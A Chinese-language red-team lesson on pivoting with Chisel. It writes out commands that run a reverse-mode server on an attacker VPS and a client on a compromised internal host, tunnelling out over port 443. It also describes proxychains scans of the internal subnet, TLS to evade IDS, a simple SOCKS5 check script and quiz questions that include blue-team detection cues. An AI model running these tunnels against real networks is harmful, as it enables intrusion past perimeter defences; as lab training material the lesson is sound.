# R20.1 Chisel 反向 SOCKS5 隧道與 HTTP 穿透 (Chisel Reverse Tunneling)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Chisel 反向 SOCKS5 隧道與 HTTP 穿透** 的物理本質為**利用以 Go 語言編寫的快速 TCP/UDP 穿透工具，將任意 TCP/UDP 連線封裝進標準 HTTP/1.1 或 WebSocket 升級通道中，透過受害主機主動向外網反向發起握手，突破邊界防火牆的入站 (Inbound) 阻斷策略**。在紅隊實戰中，目標內部伺服器通常位於深層私網（無法直接路由），但通常允許 80/443 出站連線；紅隊透過在外網部署 Chisel Server 並在內網跳板執行 Chisel Client，即可在攻擊者本機獲得一個直通目標內網的全功能 SOCKS5 代理。

```
[外網 VPS (攻擊者)] ◄── 1. 監聽特定埠 (如 443 偽裝 HTTPS): chisel server --reverse
       ▲
       │ 2. 反向建立 WebSocket 加密長連線 (Bypass 邊界防火牆 Inbound 封鎖)
       │
[內網跳板機 (Compromised Host)] ── chisel client <VPS>:443 R:socks
       │
       ▼ 3. 攻擊者本地開啟 1080 SOCKS5 端口
[攻擊者本地工具鏈: proxychains nmap / evil-winrm] ──► 直通內網隔離網段 (172.16.0.0/24)！
```

## 🔬 第一動：WebSocket 隧道封裝、多路複用與反向代理機制 (Mechanics & Multiplexing)

### 1. HTTP 升級與 WebSocket 幀傳輸
Chisel 的核心優勢在於將隧道流量偽裝成常規 Web 流量：
1. **協議升級 (Protocol Upgrade)**：
   客戶端發送帶有 `Upgrade: websocket` 與 `Connection: Upgrade` 標頭的標準 HTTP GET 請求。
2. **多路複用 (Yamux)**：
   在建立的單一 WebSocket TCP 連線上，利用 Yamux 協議實現多路複用（Multiplexing），支援數百個併發的內網 TCP 串流而無需重複交握。
3. **反向轉發 (Reverse Forwarding)**：
   傳統代理需要公網能直接連線內網主機（幾乎不可能）；反向模式（`R:socks`）讓內網跳板主動「向外推送」代理介面，使外網服務端能在本地綁定 SOCKS5 監聽埠。

### 1. 極簡 Chisel 穿透連通性模擬腳本 (Python, 20 行)
```python
# test_chisel_echo.py
import socket, sys

def test_socks5_ping(host="127.0.0.1", port=1080):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(2.0)
        s.connect((host, port))
        # 發送 SOCKS5 握手請求: \x05 (版本5) \x01 (支援1種驗證) \x00 (無密碼)
        s.sendall(b"\x05\x01\x00")
        resp = s.recv(2)
        if resp == b"\x05\x00":
            print(f"[+] SOCKS5 代理服務 [{host}:{port}] 握手成功！內網穿透隧道正常！")
            print("[+] FLAG{CHISEL_SOCKS5_PIVOTING_SUCCESS}")
            return True
    except Exception as e:
        print(f"[-] 隧道連線測試中斷: {e}")
    finally:
        s.close()
    return False

if __name__ == "__main__":
    test_socks5_ping()
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：Chisel 工具在底層傳輸上採用何種協議封裝 TCP 流量？**
  - **戰術思維**：Chisel 採用 HTTP/1.1 握手並升級為 WebSocket 協議，結合 Yamux 多路複用庫在單一 TCP 長連線上承載多個內部虛擬連線。
- [ ] **Q2：Chisel 參數中的 `R:socks` 與 `socks` 在數據流向方面有何本質區別？**
  - **戰術思維**：`socks` 是正向模式，代理埠監聽在客戶端本地；`R:socks` 是反向模式，代理埠監聽在伺服端（攻擊者 VPS），使內網受限主機能反向將內網網路暴露給攻擊者。
- [ ] **Q3：在跨網路穿透時，為何需要配置 `--tls` 參數？**
  - **戰術思維**：預設 Chisel 雖然透過 WebSocket 傳輸，但若未使用 TLS，通訊內容與 SOCKS5 連線特徵為明文，易被邊界 IDS/IPS 識別阻斷；啟用 `--tls` 可將全流量封裝於 TLS 1.3 密鑰中。
- [ ] **Q4：使用 Proxychains 配合 Chisel 掃描內網時，為何強烈建議使用 `nmap -sT` 而非 `-sS`？**
  - **戰術思維**：因為 SOCKS5 代理運作於應用層 (L7)，無法代理發送原始 Raw Socket（如 SYN 封包）；必須使用 `-sT` 完成完整 TCP 三向握手。
- [ ] **Q5：藍隊應如何從流量特徵中辨識出隱藏在 443 埠的 Chisel 穿透連線？**
  - **戰術思維**：檢測長連線行為（幾小時不中斷）、出入站數據流量高度對稱且雙向頻繁傳輸、HTTP 標頭包含 WebSocket 升級但目的 IP 非主流 CDN 或雲端服務供應商。
